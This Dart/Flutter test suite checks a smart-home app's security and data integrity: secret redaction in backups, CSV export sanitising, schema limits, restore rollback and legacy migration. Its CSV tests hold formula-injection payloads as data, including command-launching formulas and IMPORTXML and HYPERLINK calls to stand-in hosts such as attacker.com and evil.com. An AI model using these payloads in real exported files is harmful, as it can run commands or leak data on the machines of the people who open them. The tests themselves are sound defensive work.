import 'dart:convert';
import 'package:flutter_test/flutter_test.dart';
import 'package:lumivo/core/models/activity_event.dart';
import 'package:lumivo/core/models/automation_rule.dart';
import 'package:lumivo/core/models/device_command.dart';
import 'package:lumivo/core/models/energy_report.dart';
import 'package:lumivo/core/models/smart_device.dart';
import 'package:lumivo/services/backup/backup_restore_service.dart';
import 'package:lumivo/services/backup/backup_validation_service.dart';
import 'package:lumivo/services/energy/energy_insights_service.dart';
import 'package:lumivo/services/mock/mock_device_repository.dart';
import 'package:lumivo/services/security/secret_sanitizer.dart';
import 'package:lumivo/services/simulation/automation_engine.dart';
import 'package:lumivo/services/simulation/virtual_clock.dart';
import 'package:lumivo/services/storage/home_persistence_manager.dart';
import 'package:lumivo/services/storage/storage_adapter.dart';
import 'package:lumivo/services/storage/storage_adapter_stub.dart';

/// Fault-injecting storage adapter to simulate disk I/O errors or quota exhaustion.
class MockFaultyStorageAdapter implements StorageAdapter {
  MockFaultyStorageAdapter({this.failOnWrite = false});

  final Map<String, String> _store = {};
  bool failOnWrite;

  @override
  Future<String?> getString(String key) async => _store[key];

  @override
  Future<void> setString(String key, String value) async {
    if (failOnWrite && key == HomePersistenceManager.storageKey) {
      throw Exception(
          'Simulated QuotaExceededError or I/O failure on key: $key');
    }
    _store[key] = value;
  }

  @override
  Future<void> remove(String key) async => _store.remove(key);

  @override
  Future<void> clear() async => _store.clear();
}

/// Helper to generate a valid V6 backup payload dictionary.
Map<String, dynamic> buildValidV6BackupPayload({
  String homeId = 'home-1',
  String homeName = 'Main Residence',
  int deviceCount = 2,
}) {
  return {
    'metadata': {
      'schemaVersion': 6,
      'exportedAt': DateTime.now().toIso8601String(),
      'lumivoVersion': '1.0.0-rc.1',
      'homeCount': 1,
      'deviceCount': deviceCount,
    },
    'homes': [
      {
        'id': homeId,
        'name': homeName,
        'address': '101 Innovation Way',
        'role': 'Owner',
        'isCurrent': true,
        'tariffRate': 0.15,
        'currency': 'USD',
      },
    ],
    'rooms': [
      {
        'id': 'room-101',
        'name': 'Living Room',
        'iconName': 'living_room',
        'homeId': homeId,
      },
      {
        'id': 'room-102',
        'name': 'Master Bedroom',
        'iconName': 'bed',
        'homeId': homeId,
      },
    ],
    'devices': List.generate(
      deviceCount,
      (i) => {
        'id': 'dev-$i',
        'name': 'Device $i',
        'roomId': i.isEven ? 'room-101' : 'room-102',
        'type': 'light',
        'isOn': i.isEven,
        'brightness': 75,
        'powerUsageWatts': 12.5,
        'homeId': homeId,
        'customData': {'manufacturer': 'LumivoCorp'},
      },
    ),
    'scenes': [
      {
        'id': 'scene-evening',
        'name': 'Evening Relax',
        'iconName': 'nights_stay',
        'homeId': homeId,
        'actions': [
          {'deviceId': 'dev-0', 'commandType': 'setBrightness', 'value': 30},
        ],
      },
    ],
    'automations': [
      {
        'id': 'auto-sunset',
        'name': 'Sunset Lights',
        'isEnabled': true,
        'triggerType': 'schedule',
        'timeOfDay': '18:30',
        'daysOfWeek': [1, 2, 3, 4, 5, 6, 7],
        'homeId': homeId,
        'actions': [
          {'deviceId': 'dev-0', 'commandType': 'setPower', 'value': true},
        ],
      },
    ],
    'dashboardConfigs': [
      {
        'homeId': homeId,
        'sectionOrder': ['favorites', 'metrics', 'rooms'],
        'sectionVisibility': {'favorites': true, 'metrics': true},
        'statusItemOrder': ['devices_on', 'temperature'],
        'favoriteDeviceIds': ['dev-0'],
        'quickStatusVisibility': <String, dynamic>{},
      },
    ],
  };
}

void main() {
  group('Phase 9 — Security, Data Integrity & Regression Suite', () {
    late StorageAdapterImpl storage;
    late HomePersistenceManager persistenceManager;
    late MockDeviceRepository repository;
    late BackupRestoreService backupService;

    setUp(() async {
      storage = StorageAdapterImpl();
      persistenceManager = HomePersistenceManager(storage: storage);
      repository = MockDeviceRepository(
        responseDelay: Duration.zero,
        persistenceManager: persistenceManager,
      );
      backupService = const BackupRestoreService();
      BackupRestoreService.resetConcurrencyLock();
      repository.resetToDemo();
    });

    tearDown(() async {
      await repository.dispose();
      BackupRestoreService.resetConcurrencyLock();
    });

    // =========================================================================
    // 1. SENSITIVE CREDENTIAL & SECRET SCRUBBING REGRESSION
    // =========================================================================
    group('1. Sensitive Secret Scrubbing & Data Hygiene', () {
      test('Deep recursive scrubber identifies all 14 sensitive key variants',
          () {
        const sensitiveVariants = [
          'password',
          'PASSWORD',
          'wifi_password',
          'wifiPassword',
          'WiFiPass',
          'passphrase',
          'authToken',
          'auth_token',
          'accessToken',
          'refreshToken',
          'apiKey',
          'api_key',
          'privateKey',
          'secret',
          'client_secret',
          'credential',
          'authCode',
          'bearer_token',
        ];

        for (final key in sensitiveVariants) {
          expect(
            SecretSanitizer.isSensitiveKey(key),
            isTrue,
            reason: 'Failed to recognize sensitive key: $key',
          );
        }
      });

      test('Deep scrubber preserves safe non-sensitive keys intact', () {
        const safeKeys = [
          'id',
          'name',
          'roomId',
          'homeId',
          'powerUsageWatts',
          'brightness',
          'targetTemperature',
          'isOn',
          'isFavorite',
          'createdAt',
          'schemaVersion',
          'iconName',
          'description',
        ];

        for (final key in safeKeys) {
          expect(
            SecretSanitizer.isSensitiveKey(key),
            isFalse,
            reason: 'Incorrectly flagged safe key as sensitive: $key',
          );
        }
      });

      test(
          'Scrubber strips nested sensitive keys from arbitrary maps and lists',
          () {
        final dirtyPayload = {
          'id': 'home-sec-1',
          'name': 'Secure Compound',
          'wifiPassword': 'SuperSecretWifiPassword123!',
          'config': {
            'apiKey': 'AIzaSyLumivoSecretApiKey999',
            'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
            'safePort': 8883,
          },
          'devices': [
            {
              'id': 'dev-sec-1',
              'name': 'Smart Gateway',
              'privateKey': '-----BEGIN RSA PRIVATE KEY-----',
              'authCode': '987654',
              'status': 'online',
            },
          ],
        };

        final cleaned = SecretSanitizer.sanitizeMap(dirtyPayload);

        expect(cleaned.containsKey('wifiPassword'), isFalse);
        expect(cleaned.containsKey('config'), isTrue);
        final cfg = cleaned['config'] as Map<String, dynamic>;
        expect(cfg.containsKey('apiKey'), isFalse);
        expect(cfg.containsKey('token'), isFalse);
        expect(cfg['safePort'], equals(8883));

        final devList = cleaned['devices'] as List<dynamic>;
        final dev = devList.first as Map<String, dynamic>;
        expect(dev.containsKey('privateKey'), isFalse);
        expect(dev.containsKey('authCode'), isFalse);
        expect(dev['id'], equals('dev-sec-1'));
        expect(dev['status'], equals('online'));
      });

      test(
          'Backup export JSON strictly redacts sensitive credentials from customData',
          () async {
        final state = await persistenceManager.loadHomeState();
        final devWithSecrets = state.devices.first.copyWith(
          customData: {
            'manufacturer': 'LumivoSecure',
            'wifiPassword': 'PlainTextRouterPassword',
            'apiKey': 'SecretApiKey123',
            'firmwareVersion': '2.1.0',
          },
        );

        final updatedDevices = [
          devWithSecrets,
          ...state.devices.where((d) => d.id != devWithSecrets.id),
        ];
        await persistenceManager.saveDevices(updatedDevices);

        final exportedJson = await backupService.exportBackupJson(
          persistenceManager: persistenceManager,
        );

        expect(exportedJson, isNot(contains('PlainTextRouterPassword')));
        expect(exportedJson, isNot(contains('SecretApiKey123')));
        expect(exportedJson, contains('LumivoSecure'));
        expect(exportedJson, contains('2.1.0'));
      });
    });

    // =========================================================================
    // 2. CSV FORMULA INJECTION DEFENSE (CWE-1236)
    // =========================================================================
    group('2. CSV Formula Injection Defense & Neutralization', () {
      test(
          'Neutralizes formula triggers (=, +, -, @, \\t, \\r) with apostrophe',
          () {
        expect(
          EnergyInsightsService.sanitizeCsvCell('=SUM(A1:A10)'),
          equals("'=SUM(A1:A10)"),
        );
        expect(
          EnergyInsightsService.sanitizeCsvCell("+cmd|' /C calc'!A0"),
          equals("'+cmd|' /C calc'!A0"),
        );
        expect(
          EnergyInsightsService.sanitizeCsvCell('-10+20*cmd'),
          equals("'-10+20*cmd"),
        );
        expect(
          EnergyInsightsService.sanitizeCsvCell(
              '@IMPORTXML("http://attacker.com")'),
          equals("'@IMPORTXML(\"http://attacker.com\")"),
        );
        expect(
          EnergyInsightsService.sanitizeCsvCell('\tmaliciousTabCommand'),
          equals("'\tmaliciousTabCommand"),
        );
        expect(
          EnergyInsightsService.sanitizeCsvCell('\rmaliciousReturnCommand'),
          equals("'\rmaliciousReturnCommand"),
        );
      });

      test(
          'Preserves benign strings, numbers, and symbols without extra quoting',
          () {
        expect(
          EnergyInsightsService.sanitizeCsvCell('Living Room Light'),
          equals('Living Room Light'),
        );
        expect(
          EnergyInsightsService.sanitizeCsvCell('Air Conditioner (Eco Mode)'),
          equals('Air Conditioner (Eco Mode)'),
        );
        expect(
          EnergyInsightsService.sanitizeCsvCell('123 Smart St, Suite 400'),
          equals('123 Smart St, Suite 400'),
        );
        expect(
          EnergyInsightsService.sanitizeCsvCell(''),
          equals(''),
        );
      });

      test(
          'Energy report CSV export sanitizes device and room names with formula starters',
          () {
        const energyService = EnergyInsightsService();
        final report = EnergyReport(
          period: 'day',
          totalKwh: 15.5,
          totalCost: 2.32,
          tariff: 0.15,
          previousPeriodKwh: 14.0,
          percentChange: 10.71,
          generatedAt: DateTime(2026, 10, 27, 10, 0),
          deviceBreakdown: const [
            EnergyBreakdownItem(
              id: 'dev-inj-1',
              name: '=CMD|calc!A0',
              category: 'light',
              wattage: 50.0,
              kwh: 1.2,
              cost: 0.18,
            ),
            EnergyBreakdownItem(
              id: 'dev-inj-2',
              name: '+HYPERLINK("http://evil.com")',
              category: 'ac',
              wattage: 1200.0,
              kwh: 14.3,
              cost: 2.14,
            ),
          ],
          roomBreakdown: const [
            EnergyBreakdownItem(
              id: 'room-inj-1',
              name: '@SUM(1+1)',
              category: 'room',
              wattage: 1250.0,
              kwh: 15.5,
              cost: 2.32,
            ),
          ],
        );

        final csv = energyService.exportEnergyCsv(report);

        expect(csv, contains("'=CMD|calc!A0"));
        expect(csv, contains("'+HYPERLINK(\"\"http://evil.com\"\")"));
        expect(csv, contains("'@SUM(1+1)"));
        expect(csv, isNot(contains(',=CMD')));
        expect(csv, isNot(contains(',+HYPERLINK')));
        expect(csv, isNot(contains(',@SUM')));
      });
    });

    // =========================================================================
    // 3. SCHEMA VALIDATION, INVARIANT BOUNDARIES & ERROR RESILIENCE
    // =========================================================================
    group('3. Schema Validation & Defensive Bounding', () {
      test('Rejects oversized JSON payload (> 5MB) cleanly without crashing',
          () {
        final hugeBuffer =
            StringBuffer('{"metadata":{"schemaVersion":6},"padding":"');
        for (int i = 0; i < 90000; i++) {
          hugeBuffer.write(
              '0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF');
        }
        hugeBuffer.write('"}');
        final hugeJson = hugeBuffer.toString();

        expect(hugeJson.length, greaterThan(5 * 1024 * 1024));

        final result = BackupValidationService.validate(hugeJson);
        expect(result.isValid, isFalse);
        expect(result.errors.any((e) => e.contains('5MB')), isTrue);
      });

      test('Rejects payload with excessive nesting depth (> 10)', () {
        dynamic deeplyNested = {'leaf': 'value'};
        for (int i = 0; i < 15; i++) {
          deeplyNested = {'layer$i': deeplyNested};
        }

        final payload = {
          'metadata': {'schemaVersion': 6},
          'homes': [
            {'id': 'home-deep', 'name': 'Deep Home', 'nested': deeplyNested}
          ],
        };

        final jsonStr = jsonEncode(payload);
        final result = BackupValidationService.validate(jsonStr);

        expect(result.isValid, isFalse);
        expect(result.errors.any((e) => e.contains('nesting depth')), isTrue);
      });

      test(
          'Enforces entity bounds (devices <= 500, rooms <= 100, scenes <= 200, automations <= 200)',
          () {
        final excessiveDevices = List.generate(
          501,
          (i) => {
            'id': 'dev-$i',
            'name': 'Device $i',
            'roomId': 'room-1',
            'type': 'light',
            'homeId': 'home-1',
          },
        );

        final payload = buildValidV6BackupPayload();
        payload['devices'] = excessiveDevices;

        final result = BackupValidationService.validate(jsonEncode(payload));
        expect(result.isValid, isFalse);
        expect(
            result.errors.any((e) => e.contains('limit') || e.contains('500')),
            isTrue);
      });

      test('Rejects malformed JSON syntax gracefully with informative error',
          () {
        const malformed =
            '{"metadata": {"schemaVersion": 6}, "homes": [ INVALID JSON ]';
        final result = BackupValidationService.validate(malformed);

        expect(result.isValid, isFalse);
        expect(result.errors.any((e) => e.contains('Malformed JSON')), isTrue);
      });

      test('Rejects unsupported schema versions (0, 7, 99, -1) with clear code',
          () {
        const unsupportedVersions = [0, 7, 99, -1];

        for (final v in unsupportedVersions) {
          final payload = buildValidV6BackupPayload();
          payload['metadata']['schemaVersion'] = v;

          final result = BackupValidationService.validate(jsonEncode(payload));
          expect(result.isValid, isFalse,
              reason: 'Version $v should be rejected');
          expect(
            result.errors
                .any((e) => e.contains('Unsupported') || e.contains('schema')),
            isTrue,
          );
        }
      });
    });

    // =========================================================================
    // 4. STRUCTURAL & REFERENTIAL INTEGRITY REGRESSION
    // =========================================================================
    group('4. Structural & Referential Integrity Regression', () {
      test('Detects duplicate device IDs across identical or different rooms',
          () {
        final payload = buildValidV6BackupPayload();
        final devList = payload['devices'] as List<dynamic>;
        devList.add({
          'id': 'dev-0', // Duplicate ID
          'name': 'Duplicate Light',
          'roomId': 'room-101',
          'type': 'light',
          'homeId': 'home-1',
        });

        final result = BackupValidationService.validate(jsonEncode(payload));
        expect(result.isValid, isFalse);
        expect(
            result.errors
                .any((e) => e.contains('Duplicate') && e.contains('dev-0')),
            isTrue);
      });

      test(
          'Flags dangling room reference when device points to non-existent room',
          () {
        final payload = buildValidV6BackupPayload();
        final devList = payload['devices'] as List<dynamic>;
        devList.add({
          'id': 'dev-orphan',
          'name': 'Orphan Sensor',
          'roomId': 'room-non-existent-999',
          'type': 'sensor',
          'homeId': 'home-1',
        });

        final result = BackupValidationService.validate(jsonEncode(payload));
        expect(result.isValid, isFalse);
        expect(
          result.errors.any((e) =>
              e.contains('non-existent') ||
              e.contains('room-non-existent-999')),
          isTrue,
        );
      });

      test(
          'Strict multi-home isolation: multi-home backup restores scoped devices without bleed',
          () async {
        final multiHomePayload = jsonEncode({
          'metadata': {
            'schemaVersion': 6,
            'exportedAt': DateTime.now().toIso8601String(),
            'lumivoVersion': '1.0.0-rc.1',
            'homeCount': 2,
            'deviceCount': 2,
          },
          'homes': [
            {'id': 'home-alpha', 'name': 'Alpha Villa'},
            {'id': 'home-beta', 'name': 'Beta Lodge'},
          ],
          'rooms': [
            {'id': 'room-a1', 'name': 'Alpha Den', 'homeId': 'home-alpha'},
            {'id': 'room-b1', 'name': 'Beta Lounge', 'homeId': 'home-beta'},
          ],
          'devices': [
            {
              'id': 'dev-a1',
              'name': 'Alpha Light',
              'roomId': 'room-a1',
              'type': 'light',
              'homeId': 'home-alpha',
              'isOn': true,
            },
            {
              'id': 'dev-b1',
              'name': 'Beta AC',
              'roomId': 'room-b1',
              'type': 'ac',
              'homeId': 'home-beta',
              'isOn': false,
            },
          ],
          'scenes': [],
          'automations': [],
          'dashboardConfigs': [
            {
              'homeId': 'home-alpha',
              'sectionOrder': ['metrics']
            },
            {
              'homeId': 'home-beta',
              'sectionOrder': ['favorites']
            },
          ],
        });

        final restoreSuccess = await backupService.restoreBackup(
          jsonString: multiHomePayload,
          persistenceManager: persistenceManager,
        );

        expect(restoreSuccess, isTrue);

        final state = await persistenceManager.loadHomeState();
        expect(state.homes.length, equals(2));

        final alphaDevices =
            state.devices.where((d) => d.homeId == 'home-alpha').toList();
        final betaDevices =
            state.devices.where((d) => d.homeId == 'home-beta').toList();

        expect(alphaDevices.length, equals(1));
        expect(alphaDevices.first.id, equals('dev-a1'));
        expect(betaDevices.length, equals(1));
        expect(betaDevices.first.id, equals('dev-b1'));
      });
    });

    // =========================================================================
    // 5. ATOMIC TRANSACTIONAL RESTORATION & CONCURRENCY MUTEX
    // =========================================================================
    group('5. Transactional Restoration & Concurrency Mutex', () {
      test('Rejects concurrent restore requests via restore concurrency mutex',
          () async {
        final payload = jsonEncode(buildValidV6BackupPayload());

        // Launch two restore calls concurrently
        final results = await Future.wait([
          backupService.restoreBackup(
            jsonString: payload,
            persistenceManager: persistenceManager,
          ),
          backupService.restoreBackup(
            jsonString: payload,
            persistenceManager: persistenceManager,
          ),
        ]);

        // Exactly one must succeed and one must be rejected by mutex lock
        expect(results.where((r) => r == true).length, equals(1));
        expect(results.where((r) => r == false).length, equals(1));
      });

      test(
          'Rolls back atomically to pre-restore snapshot when storage fails midway',
          () async {
        final faultyStorage = MockFaultyStorageAdapter();
        final faultyPersistence =
            HomePersistenceManager(storage: faultyStorage);
        final faultyRepo = MockDeviceRepository(
          responseDelay: Duration.zero,
          persistenceManager: faultyPersistence,
        );
        faultyRepo.resetToDemo();

        final preRestoreState = await faultyPersistence.loadHomeState();
        final preRestoreDeviceCount = preRestoreState.devices.length;

        // Arm failure on persistence save
        faultyStorage.failOnWrite = true;

        final newPayload = buildValidV6BackupPayload(
          homeId: preRestoreState.currentHomeId,
          deviceCount: 15,
        );

        final success = await backupService.restoreBackup(
          jsonString: jsonEncode(newPayload),
          persistenceManager: faultyPersistence,
        );

        expect(success, isFalse);

        // Disarm failure and check state is preserved
        faultyStorage.failOnWrite = false;
        final rolledBackState = await faultyPersistence.loadHomeState();
        expect(rolledBackState.devices.length, equals(preRestoreDeviceCount));
        await faultyRepo.dispose();
      });
    });

    // =========================================================================
    // 6. STORAGE RESILIENCE & QUOTA RECOVERY
    // =========================================================================
    group('6. Storage Fault Recovery & Snapshot Management', () {
      test('Creates, validates, and restores known-good recovery snapshot',
          () async {
        final initial = await persistenceManager.loadHomeState();
        expect(await persistenceManager.hasSnapshot(), isFalse);

        // Save snapshot
        await persistenceManager.saveSnapshot();
        expect(await persistenceManager.hasSnapshot(), isTrue);

        // Mutate state
        final modifiedState = initial.copyWith(
          devices: [
            ...initial.devices,
            const SmartDevice(
              id: 'dev-temporary',
              name: 'Temporary Sensor',
              roomId: 'room-living',
              type: DeviceType.sensor,
              homeId: 'home-default',
              isOn: false,
            ),
          ],
        );
        await persistenceManager.saveHomeState(modifiedState);
        expect((await persistenceManager.loadHomeState()).devices.length,
            equals(initial.devices.length + 1));

        // Restore snapshot
        final restored = await persistenceManager.restoreSnapshot();
        expect(restored, isTrue);
        final reloaded = await persistenceManager.loadHomeState();
        expect(reloaded.devices.length, equals(initial.devices.length));
        expect(reloaded.devices.any((d) => d.id == 'dev-temporary'), isFalse);
      });

      test(
          'Corrupted JSON record in storage falls back gracefully to demo defaults without crash',
          () async {
        // Write invalid JSON garbage to storage
        await storage.setString(
            HomePersistenceManager.storageKey, '<<<CORRUPT_NOT_JSON>>>');

        final loaded = await persistenceManager.loadHomeState();
        expect(
            loaded.schemaVersion, equals(HomePersistenceManager.schemaVersion));
        expect(loaded.homes.isNotEmpty, isTrue);
        expect(loaded.devices.isNotEmpty, isTrue);
      });
    });

    // =========================================================================
    // 7. SIMULATION ENGINE, VIRTUAL CLOCK & LOOP GUARD STABILITY
    // =========================================================================
    group('7. Simulation Engine, Clock Determinism & Stability', () {
      test(
          'VirtualClock advances deterministically with multipliers (1x, 10x, 60x)',
          () {
        final clock = VirtualClock(
          initialTime: DateTime(2026, 10, 27, 8, 0, 0),
          initialMultiplier: 1.0,
        );

        expect(clock.now, equals(DateTime(2026, 10, 27, 8, 0, 0)));

        clock.advance(const Duration(minutes: 5));
        expect(clock.now, equals(DateTime(2026, 10, 27, 8, 5, 0)));

        clock.setMultiplier(10.0);
        expect(clock.timeMultiplier, equals(10.0));

        clock.setMultiplier(60.0);
        expect(clock.timeMultiplier, equals(60.0));

        clock.setMultiplier(-5.0); // Negative multiplier clamped to 0
        expect(clock.timeMultiplier, equals(0.0));

        clock.dispose();
      });

      test(
          'Energy calculations handle edge cases (negative wattage clamped to zero, no NaN/Infinity)',
          () {
        expect(EnergyInsightsService.calculateKwh(-50.0, 24.0), equals(0.0));
        expect(EnergyInsightsService.calculateKwh(100.0, -10.0), equals(0.0));
        expect(EnergyInsightsService.calculateCost(-10.0, 0.15), equals(0.0));
        expect(EnergyInsightsService.calculateCost(10.0, -0.15), equals(0.0));
        expect(EnergyInsightsService.calculatePercentChange(10.0, 0.0),
            equals(100.0));
        expect(EnergyInsightsService.calculatePercentChange(0.0, 0.0),
            equals(0.0));

        const service = EnergyInsightsService();
        final report = service.generateReport(
          devices: const [
            SmartDevice(
              id: 'dev-test',
              name: 'Test Bulb',
              roomId: 'room-1',
              type: DeviceType.light,
              homeId: 'home-1',
              isOn: true,
              powerUsageWatts: 60.0,
            ),
          ],
          period: 'day',
          tariff: 0.15,
        );

        expect(report.totalKwh.isNaN, isFalse);
        expect(report.totalKwh.isInfinite, isFalse);
        expect(report.totalCost.isNaN, isFalse);
        expect(report.totalCost.isInfinite, isFalse);
        expect(report.totalKwh, greaterThan(0.0));
      });

      test(
          'AutomationEngine loop guard halts high-frequency triggers within 1-second window',
          () async {
        final rules = [
          AutomationRule(
            id: 'rule-loop-test',
            name: 'Rapid Schedule Rule',
            triggerType: TriggerType.schedule,
            timeOfDay: '12:00',
            homeId: 'home-1',
            actions: const [
              DeviceAction(
                deviceId: 'dev-0',
                commandType: DeviceCommandType.setPower,
                value: true,
              ),
            ],
          ),
        ];

        int executionCount = 0;
        final engine = AutomationEngine(
          initialRules: rules,
          onDispatchAction: (action) async {
            executionCount++;
          },
        );

        final targetTime = DateTime(2026, 10, 27, 12, 0, 0);

        // Evaluate rule multiple times in the same second
        for (int i = 0; i < 10; i++) {
          await engine.evaluate(
            virtualTime: targetTime,
            devices: const [],
          );
        }

        // Loop guard allows at most 5 triggers per second
        expect(executionCount, lessThanOrEqualTo(5));
        engine.dispose();
      });

      test(
          'Activity event stream caps memory list at 100 entries to prevent memory bloat',
          () async {
        final initialEvents = List.generate(
          150,
          (i) => ActivityEvent(
            id: 'evt-$i',
            timestamp: DateTime(2026, 10, 27, 8, 0).add(Duration(minutes: i)),
            title: 'Event $i',
            description: 'Automated description $i',
            homeId: 'home-default',
          ),
        );

        await persistenceManager.saveActivityEvents(initialEvents);
        final loaded = await persistenceManager.loadHomeState();

        expect(loaded.activityEvents.length, equals(100));
        expect(loaded.activityEvents.first.id, equals('evt-0'));
      });
    });

    // =========================================================================
    // 8. LEGACY MIGRATION PATHS (V1 THROUGH V6)
    // =========================================================================
    group('8. Backward Compatibility & Legacy Schema Migration', () {
      test(
          'Migrates Legacy V1 payload safely to Schema V6 with backfilled fields',
          () async {
        final v1Payload = {
          'devices': [
            {
              'id': 'v1-dev-1',
              'name': 'Vintage Lamp',
              'roomId': 'Living Room',
              'type': 'light',
              'isOn': true,
              'brightness': 75,
            },
          ],
          'rooms': [
            {'id': 'Living Room', 'name': 'Living Room'},
          ],
          'scenes': [],
          'automations': [],
        };

        await storage.remove(HomePersistenceManager.storageKey);
        await storage.setString(
          HomePersistenceManager.legacyStorageKey,
          jsonEncode(v1Payload),
        );

        final freshManager = HomePersistenceManager(storage: storage);
        final migrated = await freshManager.loadHomeState();

        expect(migrated.schemaVersion, equals(6));
        expect(migrated.devices.any((d) => d.id == 'v1-dev-1'), isTrue);
        final lamp = migrated.devices.firstWhere((d) => d.id == 'v1-dev-1');
        expect(lamp.homeId, equals('home-default'));
        expect(migrated.homes.length, greaterThanOrEqualTo(2));
        expect(await storage.getString(HomePersistenceManager.legacyStorageKey),
            isNull);
      });

      test('Migrates V4 payload safely with multi-home and tariff rate support',
          () async {
        final v4Payload = {
          'schemaVersion': 4,
          'homes': [
            {'id': 'home-v4', 'name': 'V4 Residence', 'isCurrent': true}
          ],
          'rooms': [
            {'id': 'room-v4', 'name': 'V4 Room', 'homeId': 'home-v4'}
          ],
          'devices': [
            {
              'id': 'dev-v4',
              'name': 'V4 Light',
              'roomId': 'room-v4',
              'type': 'light',
              'homeId': 'home-v4',
              'isOn': false,
            }
          ],
        };

        final validation =
            BackupValidationService.validate(jsonEncode(v4Payload));
        expect(validation.isValid, isTrue);

        final success = await backupService.restoreBackup(
          jsonString: jsonEncode(v4Payload),
          persistenceManager: persistenceManager,
        );
        expect(success, isTrue);

        final restoredState = await persistenceManager.loadHomeState();
        expect(restoredState.schemaVersion, equals(6));
        expect(restoredState.devices.any((d) => d.id == 'dev-v4'), isTrue);
      });
    });
  });
}
